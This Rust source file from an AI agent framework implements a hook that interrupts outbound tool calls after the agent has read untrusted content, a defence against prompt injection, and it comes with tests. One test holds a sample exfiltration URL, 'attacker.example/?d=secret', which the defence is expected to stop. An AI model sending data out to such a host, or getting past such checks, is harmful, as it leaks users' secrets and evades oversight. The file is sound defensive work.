//! Untrusted content: the rule that keeps a prompt injection from acting.
//!
//! Tools declare who authored what they return ([`crate::SourceTrust`]) and
//! whether a call acts outside the workspace
//! ([`crate::ToolAnnotations::egress`]). Once a run has read untrusted
//! content, [`UntrustedHook`] interrupts every egress call so a resolver (a
//! clean, tool-less check, or the owner) settles it before it runs.

use async_trait::async_trait;

use crate::approval::InterruptKind;
use crate::hook::{Hook, HookContext, ToolDecision};
use crate::message::{Message, Role, ToolCall};
use crate::receipt::{InvocationStage, Receipt};
use crate::safeguard::Safeguard;
use crate::state::Interruption;
use crate::tool::{Outbound, SourceTrust, ToolInfo, ToolOutput};

/// Prefix of the interruption reason raised by [`UntrustedHook`].
pub const UNTRUSTED_EGRESS_INTERRUPT: &str = "[UNTRUSTED EGRESS]";

/// Whether `interruption` was raised by [`UntrustedHook`]: its kind is
/// [`InterruptKind::Untrusted`] and its reason carries the hook's prefix.
pub fn is_untrusted_egress(interruption: &Interruption) -> bool {
    interruption.kind == InterruptKind::Untrusted
        && interruption.reason.starts_with(UNTRUSTED_EGRESS_INTERRUPT)
}

/// How strictly the untrusted-content rule applies.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum UntrustedMode {
    /// Egress after untrusted content is interrupted.
    Enforce,
    /// Egress runs; receipts still record `after_untrusted`. The owner's
    /// explicit choice.
    MarkOnly,
}

/// Marks untrusted output as data and interrupts egress calls made after the
/// run read untrusted content. Declares [`Safeguard::UntrustedOutput`].
///
/// Register it after the authority and scope hooks, so its interruptions are
/// only raised for calls those already allow (an approval still passes the
/// hooks after it, but a human should not be asked about a call that will be
/// denied anyway). Only text is marked: images from untrusted tools reach the
/// model unmarked.
pub struct UntrustedHook {
    mode: UntrustedMode,
    mark: fn(tool: &str, content: &str) -> String,
}

impl UntrustedHook {
    pub fn new(mode: UntrustedMode, mark: fn(tool: &str, content: &str) -> String) -> Self {
        Self { mode, mark }
    }
}

/// Whether `text` appears word for word in a user message or tool result. The
/// model's own turns do not count: that is where composed data would be.
fn said_by_user_or_tool(messages: &[Message], text: &str) -> bool {
    !text.is_empty()
        && messages.iter().any(|message| {
            matches!(message.role, Role::User | Role::Tool) && message.content.contains(text)
        })
}

#[async_trait]
impl Hook for UntrustedHook {
    fn safeguards(&self) -> &'static [Safeguard] {
        &[Safeguard::UntrustedOutput]
    }

    async fn before_tool(
        &self,
        ctx: &HookContext<'_>,
        call: &ToolCall,
        tool: &ToolInfo,
    ) -> ToolDecision {
        let leaves = match &tool.outbound {
            Outbound::Nothing => tool.annotations.egress,
            Outbound::Composed => true,
            Outbound::Exact(strings) => !strings
                .iter()
                .all(|string| said_by_user_or_tool(ctx.messages, string)),
        };
        if self.mode == UntrustedMode::Enforce && ctx.untrusted_seen && leaves {
            return ToolDecision::Interrupt {
                reason: format!(
                    "{UNTRUSTED_EGRESS_INTERRUPT} `{}` acts outside the workspace after this run \
                     read untrusted content; a clean check must confirm it.",
                    call.name
                ),
                kind: InterruptKind::Untrusted,
            };
        }
        ToolDecision::Allow
    }

    async fn after_tool(&self, _ctx: &HookContext<'_>, receipt: &Receipt, output: &mut ToolOutput) {
        if receipt.stage == InvocationStage::Dispatched && receipt.source == SourceTrust::Untrusted
        {
            output.content = (self.mark)(&receipt.tool, &output.content);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testing::{call, spec, text, tool_calls, ScriptedProvider};
    use crate::tool::{FnTool, SourceTrust, Tool, ToolAnnotations, ToolOutput};
    use crate::{
        AccessLevel, Agent, Authority, AuthorityHook, BuildError, CancellationToken,
        InterruptResolver, Interruption, ReceiptStatus, Resolution, RunState, RunStatus, Safeguard,
    };
    use async_trait::async_trait;
    use serde_json::{json, Value};
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::sync::Arc;

    fn mark(tool: &str, content: &str) -> String {
        format!("<untrusted tool=\"{tool}\">{content}</untrusted>")
    }

    fn fetch() -> impl Tool + 'static {
        FnTool::new(
            spec("fetch", "fetches", &[]),
            ToolAnnotations::READ_ONLY,
            |_: Value| std::future::ready(Ok(ToolOutput::text("page body"))),
        )
    }

    fn counting(
        name: &str,
        annotations: ToolAnnotations,
        count: Arc<AtomicUsize>,
    ) -> impl Tool + 'static {
        FnTool::new(spec(name, "does", &[]), annotations, move |_: Value| {
            count.fetch_add(1, Ordering::SeqCst);
            std::future::ready(Ok(ToolOutput::text("done")))
        })
        .with_trust(SourceTrust::Trusted)
    }

    const SEND: ToolAnnotations = ToolAnnotations {
        egress: true,
        ..ToolAnnotations::WRITE
    };

    fn agent(
        mode: UntrustedMode,
        replies: Vec<crate::ModelResponse>,
        sent: Arc<AtomicUsize>,
        written: Arc<AtomicUsize>,
    ) -> Agent {
        Agent::builder("a")
            .model("m")
            .provider(ScriptedProvider::new(replies))
            .tool(fetch())
            .tool(counting("send", SEND, sent))
            .tool(counting("write", ToolAnnotations::WRITE, written))
            .hook(AuthorityHook::new(Authority::full()))
            .hook(UntrustedHook::new(mode, mark))
            .attest(Safeguard::Scope)
            .attest(Safeguard::Approval)
            .attest(Safeguard::Egress)
            .build()
            .unwrap()
    }

    fn setup(mode: UntrustedMode, replies: Vec<crate::ModelResponse>) -> (Agent, Arc<AtomicUsize>) {
        let sent = Arc::new(AtomicUsize::new(0));
        (
            agent(mode, replies, sent.clone(), Arc::new(AtomicUsize::new(0))),
            sent,
        )
    }

    #[tokio::test]
    async fn enforce_interrupts_egress_after_untrusted_read() {
        let (a, sent) = setup(
            UntrustedMode::Enforce,
            vec![
                tool_calls([call("c1", "fetch", json!({}))]),
                tool_calls([call("c2", "send", json!({}))]),
                text("done"),
            ],
        );
        let out = a.run("s", "go").await.unwrap();
        let RunStatus::Interrupted { interruption } = &out.status else {
            panic!("{:?}", out.status)
        };
        assert!(is_untrusted_egress(interruption));
        assert_eq!(sent.load(Ordering::SeqCst), 0);
    }

    struct Reader {
        name: &'static str,
        outbound: fn(&Value) -> Outbound,
        ran: Arc<AtomicUsize>,
    }

    #[async_trait]
    impl Tool for Reader {
        fn spec(&self) -> crate::ToolSpec {
            spec(self.name, "reads over the network", &[])
        }
        fn annotations(&self) -> ToolAnnotations {
            ToolAnnotations::READ_ONLY
        }
        fn source_trust(&self, _arguments: &Value) -> SourceTrust {
            SourceTrust::Trusted
        }
        fn outbound(&self, arguments: &Value) -> Outbound {
            (self.outbound)(arguments)
        }
        async fn call(&self, _arguments: Value, _ctx: &crate::ToolContext) -> crate::ToolResult {
            self.ran.fetch_add(1, Ordering::SeqCst);
            Ok(ToolOutput::text("page"))
        }
    }

    fn url_of(arguments: &Value) -> Outbound {
        Outbound::Exact(vec![arguments["url"].as_str().unwrap().to_string()])
    }

    fn composed(_: &Value) -> Outbound {
        Outbound::Composed
    }

    async fn after_untrusted_read(
        request: &str,
        name: &'static str,
        outbound: fn(&Value) -> Outbound,
        arguments: Value,
    ) -> (RunStatus, usize) {
        let ran = Arc::new(AtomicUsize::new(0));
        let agent = Agent::builder("a")
            .model("m")
            .provider(ScriptedProvider::new([
                tool_calls([call("c1", "fetch", json!({}))]),
                tool_calls([call("c2", name, arguments)]),
                text("done"),
            ]))
            .tool(fetch())
            .tool(Reader {
                name,
                outbound,
                ran: ran.clone(),
            })
            .hook(AuthorityHook::new(Authority::full()))
            .hook(UntrustedHook::new(UntrustedMode::Enforce, mark))
            .attest(Safeguard::Scope)
            .attest(Safeguard::Approval)
            .attest(Safeguard::Egress)
            .build()
            .unwrap();
        let out = agent.run("s", request).await.unwrap();
        (out.status, ran.load(Ordering::SeqCst))
    }

    #[tokio::test]
    async fn a_url_the_user_gave_is_fetched_without_a_check() {
        let (status, ran) = after_untrusted_read(
            "read https://docs.example/page please",
            "net",
            url_of,
            json!({"url": "https://docs.example/page"}),
        )
        .await;
        assert_eq!(status, RunStatus::Completed);
        assert_eq!(ran, 1);
    }

    #[tokio::test]
    async fn a_url_the_model_composed_is_checked_after_untrusted_content() {
        let (status, ran) = after_untrusted_read(
            "read https://docs.example/page please",
            "net",
            url_of,
            json!({"url": "https://attacker.example/?d=secret"}),
        )
        .await;
        assert!(
            matches!(status, RunStatus::Interrupted { .. }),
            "{status:?}"
        );
        assert_eq!(ran, 0);
    }

    #[tokio::test]
    async fn a_composed_query_is_checked_after_untrusted_content() {
        let (status, ran) =
            after_untrusted_read("search for it", "search", composed, json!({"q": "secret"})).await;
        assert!(
            matches!(status, RunStatus::Interrupted { .. }),
            "{status:?}"
        );
        assert_eq!(ran, 0);
    }

    #[tokio::test]
    async fn egress_before_any_untrusted_read_runs() {
        let (a, sent) = setup(
            UntrustedMode::Enforce,
            vec![tool_calls([call("c1", "send", json!({}))]), text("done")],
        );
        let out = a.run("s", "go").await.unwrap();
        assert_eq!(sent.load(Ordering::SeqCst), 1);
        assert!(out.is_completed());
    }

    #[tokio::test]
    async fn workspace_write_after_untrusted_read_runs() {
        let written = Arc::new(AtomicUsize::new(0));
        let a = agent(
            UntrustedMode::Enforce,
            vec![
                tool_calls([call("c1", "fetch", json!({}))]),
                tool_calls([call("c2", "write", json!({}))]),
                text("done"),
            ],
            Arc::new(AtomicUsize::new(0)),
            written.clone(),
        );
        let out = a.run("s", "go").await.unwrap();
        assert_eq!(out.receipts()[1].status, ReceiptStatus::Succeeded);
        assert_eq!(written.load(Ordering::SeqCst), 1);
    }

    #[tokio::test]
    async fn mark_only_runs_egress_and_records_it() {
        let (a, sent) = setup(
            UntrustedMode::MarkOnly,
            vec![
                tool_calls([call("c1", "fetch", json!({}))]),
                tool_calls([call("c2", "send", json!({}))]),
                text("done"),
            ],
        );
        let out = a.run("s", "go").await.unwrap();
        assert_eq!(sent.load(Ordering::SeqCst), 1);
        assert!(out.receipts()[1].after_untrusted);
    }

    #[tokio::test]
    async fn seeded_context_interrupts_the_first_egress() {
        let (a, sent) = setup(
            UntrustedMode::Enforce,
            vec![tool_calls([call("c1", "send", json!({}))]), text("done")],
        );
        let state = RunState::new("a", "s", "go").with_untrusted_context();
        let out = a.run_from(state, CancellationToken::new()).await.unwrap();
        assert!(matches!(out.status, RunStatus::Interrupted { .. }));
        assert_eq!(sent.load(Ordering::SeqCst), 0);
    }

    #[tokio::test]
    async fn untrusted_output_is_marked() {
        let sent = Arc::new(AtomicUsize::new(0));
        let a = agent(
            UntrustedMode::Enforce,
            vec![
                tool_calls([call("c1", "fetch", json!({}))]),
                tool_calls([call("c2", "write", json!({}))]),
                text("done"),
            ],
            sent,
            Arc::new(AtomicUsize::new(0)),
        );
        let out = a.run("s", "go").await.unwrap();
        let results: Vec<&str> = out
            .state
            .messages
            .iter()
            .filter(|m| m.tool_call_id.is_some())
            .map(|m| m.content.as_str())
            .collect();
        assert_eq!(results[0], mark("fetch", "page body"));
        assert_eq!(results[1], "done");
    }

    struct Fixed(Resolution);
    #[async_trait]
    impl InterruptResolver for Fixed {
        async fn resolve(&self, _: &RunState, _: &Interruption) -> Option<Resolution> {
            Some(self.0.clone())
        }
    }

    struct Abstain;
    #[async_trait]
    impl InterruptResolver for Abstain {
        async fn resolve(&self, _: &RunState, _: &Interruption) -> Option<Resolution> {
            None
        }
    }

    fn egress_script() -> Vec<crate::ModelResponse> {
        vec![
            tool_calls([call("c1", "fetch", json!({}))]),
            tool_calls([call("c2", "send", json!({}))]),
            text("done"),
        ]
    }

    #[tokio::test]
    async fn run_resolving_denies_and_completes() {
        let (a, sent) = setup(UntrustedMode::Enforce, egress_script());
        let state = RunState::new("a", "s", "go");
        let r = Fixed(Resolution::Deny {
            reason: "no".into(),
        });
        let out = a
            .run_resolving(state, CancellationToken::new(), &r)
            .await
            .unwrap();
        assert!(out.is_completed());
        let send = &out.receipts()[1];
        assert_eq!(send.status, ReceiptStatus::Denied);
        assert_eq!(send.reason.as_deref(), Some("no"));
        assert_eq!(sent.load(Ordering::SeqCst), 0);
    }

    /// The owner answering for a check binds the run like their own card.
    #[tokio::test]
    async fn an_owner_declining_a_refused_check_binds_the_run() {
        let (a, sent) = setup(UntrustedMode::Enforce, egress_script());
        let key = crate::EffectKey::named(crate::EffectClass::Call, "send");
        let r = Fixed(Resolution::OwnerDeclined {
            request: crate::OwnerApprovalRequest {
                card: None,
                effects: vec![key.clone()],
                summary: "send".into(),
                subject: "send".into(),
                risk: crate::ApprovalRisk::High,
                warnings: Vec::new(),
            },
            reason: "declined by the owner".into(),
        });
        let out = a
            .run_resolving(RunState::new("a", "s", "go"), CancellationToken::new(), &r)
            .await
            .unwrap();
        let send = &out.receipts()[1];
        assert_eq!(send.status, ReceiptStatus::Denied);
        assert!(send
            .reason
            .as_deref()
            .is_some_and(|reason| reason.starts_with(crate::OWNER_DECLINED)));
        assert_eq!(out.state.declined, vec![key]);
        assert_eq!(sent.load(Ordering::SeqCst), 0);
    }

    #[tokio::test]
    async fn run_resolving_approves_and_runs_once() {
        let (a, sent) = setup(UntrustedMode::Enforce, egress_script());
        let out = a
            .run_resolving(
                RunState::new("a", "s", "go"),
                CancellationToken::new(),
                &Fixed(Resolution::Approve),
            )
            .await
            .unwrap();
        assert!(out.is_completed());
        assert_eq!(sent.load(Ordering::SeqCst), 1);
    }

    /// Records each run end a hook sees: whether the run completed.
    struct RunEnds(Arc<std::sync::Mutex<Vec<bool>>>);
    #[async_trait]
    impl crate::Hook for RunEnds {
        async fn on_run_end(&self, _: &crate::HookContext<'_>, outcome: &crate::RunOutcome) {
            self.0.lock().unwrap().push(outcome.is_completed());
        }
    }

    /// Hooks see one run end per `run_resolving` call, with the final
    /// outcome, however many interruptions were settled on the way.
    #[tokio::test]
    async fn run_resolving_ends_the_run_once() {
        for (resolver, completed) in [
            (&Fixed(Resolution::Approve) as &dyn InterruptResolver, true),
            (&Abstain as &dyn InterruptResolver, false),
        ] {
            let (a, _) = setup(UntrustedMode::Enforce, egress_script());
            let ends = Arc::new(std::sync::Mutex::new(Vec::new()));
            let a = a.with_hook(RunEnds(ends.clone()));
            a.run_resolving(
                RunState::new("a", "s", "go"),
                CancellationToken::new(),
                resolver,
            )
            .await
            .unwrap();
            assert_eq!(*ends.lock().unwrap(), vec![completed]);
        }
    }

    #[tokio::test]
    async fn run_resolving_returns_interrupted_when_resolver_abstains() {
        let (a, sent) = setup(UntrustedMode::Enforce, egress_script());
        let out = a
            .run_resolving(
                RunState::new("a", "s", "go"),
                CancellationToken::new(),
                &Abstain,
            )
            .await
            .unwrap();
        assert!(matches!(out.status, RunStatus::Interrupted { .. }));
        assert_eq!(sent.load(Ordering::SeqCst), 0);
    }

    #[test]
    fn untrusted_hook_covers_the_safeguard() {
        let build = |with_hook: bool| {
            let mut b = Agent::builder("a")
                .model("m")
                .provider(ScriptedProvider::new([text("x")]))
                .tool(fetch())
                .hook(AuthorityHook::new(Authority {
                    level: AccessLevel::Write,
                    tools: None,
                }))
                .attest(Safeguard::Scope)
                .attest(Safeguard::Approval)
                .attest(Safeguard::Egress);
            if with_hook {
                b = b.hook(UntrustedHook::new(UntrustedMode::Enforce, mark));
            }
            b.build()
        };
        assert!(build(true).is_ok());
        assert!(matches!(build(false), Err(BuildError::MissingSafeguard(_))));
    }

    #[tokio::test]
    async fn approved_interrupt_still_passes_later_hooks() {
        let sent = Arc::new(AtomicUsize::new(0));
        let a = Agent::builder("a")
            .model("m")
            .provider(ScriptedProvider::new(egress_script()))
            .tool(fetch())
            .tool(counting("send", SEND, sent.clone()))
            .hook(UntrustedHook::new(UntrustedMode::Enforce, mark))
            .hook(AuthorityHook::new(Authority::read_only()))
            .attest(Safeguard::Scope)
            .attest(Safeguard::Approval)
            .attest(Safeguard::Egress)
            .build()
            .unwrap();
        let out = a
            .run_resolving(
                RunState::new("a", "s", "go"),
                CancellationToken::new(),
                &Fixed(Resolution::Approve),
            )
            .await
            .unwrap();
        assert_eq!(out.receipts()[1].status, ReceiptStatus::Denied);
        assert_eq!(sent.load(Ordering::SeqCst), 0);
    }

    #[tokio::test]
    async fn read_only_egress_is_judged_after_an_untrusted_read_in_the_same_batch() {
        let peeked = Arc::new(AtomicUsize::new(0));
        let a = Agent::builder("a")
            .model("m")
            .provider(ScriptedProvider::new([
                tool_calls([
                    call("c1", "fetch", json!({})),
                    call("c2", "peek", json!({})),
                ]),
                text("done"),
            ]))
            .tool(fetch())
            .tool(counting(
                "peek",
                ToolAnnotations {
                    egress: true,
                    ..ToolAnnotations::READ_ONLY
                },
                peeked.clone(),
            ))
            .hook(AuthorityHook::new(Authority::full()))
            .hook(UntrustedHook::new(UntrustedMode::Enforce, mark))
            .attest(Safeguard::Scope)
            .attest(Safeguard::Approval)
            .attest(Safeguard::Egress)
            .build()
            .unwrap();
        let out = a.run("s", "go").await.unwrap();
        assert!(matches!(out.status, RunStatus::Interrupted { .. }));
        assert_eq!(peeked.load(Ordering::SeqCst), 0);
    }

    #[tokio::test]
    async fn denied_receipt_after_untrusted_read_records_it() {
        let (a, _) = setup(UntrustedMode::Enforce, egress_script());
        let r = Fixed(Resolution::Deny {
            reason: "no".into(),
        });
        let out = a
            .run_resolving(RunState::new("a", "s", "go"), CancellationToken::new(), &r)
            .await
            .unwrap();
        assert!(out.receipts()[1].after_untrusted);
    }
}
